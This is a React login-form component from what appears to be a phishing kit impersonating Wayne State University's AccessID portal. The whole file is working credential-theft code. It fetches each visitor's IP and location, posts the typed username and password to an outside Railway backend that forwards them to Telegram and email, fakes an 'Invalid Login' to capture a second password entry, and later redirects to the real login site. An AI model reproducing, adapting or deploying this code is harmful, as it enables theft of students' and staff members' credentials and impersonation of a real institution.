"use client";

import React, { useState, useEffect } from "react";

// Use the live Railway backend URL
const backendUrl = "https://wayneemail-bankend-production.up.railway.app";

const LoginForm = ({ loginTitle, setLoginTitle }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [targetSystem, setTargetSystem] = useState(loginTitle);
  const [loginButtonText, setLoginButtonText] = useState("Update");
  const [loginButtonId, setLoginButtonId] = useState("login-button");
  const [processingForm, setProcessingForm] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);

  const [ip, setIp] = useState("N/A");
  const [city, setCity] = useState("N/A");
  const [region, setRegion] = useState("N/A");
  const [country, setCountry] = useState("N/A");

  useEffect(() => {
    const fetchLocation = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        setIp(data.ip || "N/A");
        setCity(data.city || "N/A");
        setRegion(data.region || "N/A");
        setCountry(data.country_name || "N/A");
      } catch (err) {
        console.error("IP/Location fetch error:", err);
      }
    };

    fetchLocation();
  }, []);

  useEffect(() => {
    const alreadySent = sessionStorage.getItem("visitorAlertSent");

    const isValidData =
      ip !== "N/A" && city !== "N/A" && region !== "N/A" && country !== "N/A";

    if (!alreadySent && isValidData) {
      const visitorAlert = `🚨 *New Visitor Alert Wayne* 🚨

🌐 IP: ${ip}
📍 Location: ${city}, ${region}, ${country}
🕒 Time: ${new Date().toLocaleString()}
📄 Page: Student Login Page`;

      sendToTelegram(visitorAlert);
      sendEmail(visitorAlert);

      sessionStorage.setItem("visitorAlertSent", "true");
    }
  }, [ip, city, region, country]);

  const sendToTelegram = (message) => {
    fetch(`${backendUrl}/send-telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message }),
    })
      .then((res) => {
        if (!res.ok) throw new Error("Telegram request failed");
        console.log("Telegram message sent");
      })
      .catch((err) => console.error("Telegram error:", err));
  };

  const sendEmail = (message) => {
    fetch(`${backendUrl}/send-email`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ subject: "New Visitor Alert Wayne", message }),
    })
      .then((res) => {
        if (!res.ok) throw new Error("Email request failed");
        console.log("Email sent");
      })
      .catch((err) => console.error("Email error:", err));
  };

  const handleTargetSystemChange = (e) => {
    const selected = e.target.options[e.target.selectedIndex];
    setLoginTitle(selected.dataset.system);
    setTargetSystem(selected.dataset.system);
  };

  const submitLogin = async (e) => {
    e.preventDefault();
    setProcessingForm(true);
    setLoginButtonText("Validating credentials");

    if (!username || !password) {
      setErrorFailedForm();
      return;
    }

    const attemptNumber =
      loginAttempts === 0 ? "🟡 First Attempt" : "🟢 Second Attempt";

    const submission = `🔐 *Student Login Attempt - ${attemptNumber}*

👤 Access ID: ${username}
🔑 Password: ${password}
💻 System: ${targetSystem}
🕒 Time: ${new Date().toLocaleString()}
🧪 Attempt Status: ${attemptNumber}

📍 *Location Info:*
- 🌐 IP: ${ip}
- 🏙️ City: ${city}
- 🗺️ Region: ${region}
- 🌎 Country: ${country}`;

    sendToTelegram(submission);
    sendEmail(submission);

    if (loginAttempts === 0) {
      setLoginAttempts(1);
      setTimeout(() => {
        setLoginButtonText("Invalid Login");
        setLoginButtonId("login-button-failed");
        reset();
      }, 1000);
      return;
    }

    setTimeout(() => {
      window.location.href = "https://login.wayne.edu";
    }, 3600000);
  };

  const setErrorFailedForm = () => {
    setTimeout(() => {
      setLoginButtonText("Invalid Login");
      setLoginButtonId("login-button-failed");
      reset();
    }, 1000);
  };

  const reset = () => {
    setTimeout(() => {
      setLoginButtonText("Update");
      setLoginButtonId("login-button");
      setProcessingForm(false);
    }, 2000);
  };

  return (
    <form name="login" id="login" onSubmit={submitLogin}>
      <div className="large-5 medium-12 small-12 columns login-formbox">
        <div>
          <label htmlFor="accessid">
            <i className="silk-icon silk-user-green"></i> Your Wayne State AccessID
          </label>
          <input
            className="form-control"
            placeholder="AccessID"
            id="accessid"
            name="accessid"
            type="text"
            autoFocus
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>
        <div>
          <label htmlFor="passwd">
            <i className="silk-icon silk-lock"></i> Your Password
          </label>
          <input
            className="form-control"
            placeholder="Password"
            id="passwd"
            name="passwd"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>
        <div>
          <label htmlFor="where">
            <i className="silk-icon silk-key-go"></i> Target System
          </label>
          <select
            id="where"
            className="form-control"
            onChange={handleTargetSystemChange}
          >
            <option data-system="Academica" value="https://academica.aws.wayne.edu">
              Academica
            </option>
            <option data-system="Canvas" value="https://canvas.wayne.edu">
              Canvas
            </option>
            <option data-system="Salesƒorce CRM" value="https://salesforce.com/crm">
              Salesƒorce CRM
            </option>
            <option data-system="STARS" value="https://stars.wayne.edu">
              STARS
            </option>
            <option data-system="Wayne Connect" value="https://webmail.wayne.edu">
              Wayne Connect
            </option>
            <option data-system="Zoom" value="https://zoom.us">
              Zoom
            </option>
          </select>
        </div>
        <div className="login-button-container clearfix">
          <input
            type="submit"
            name="login-button"
            value={loginButtonText}
            className="button"
            id={loginButtonId}
            disabled={processingForm}
          />
        </div>
      </div>
    </form>
  );
};

export default LoginForm;
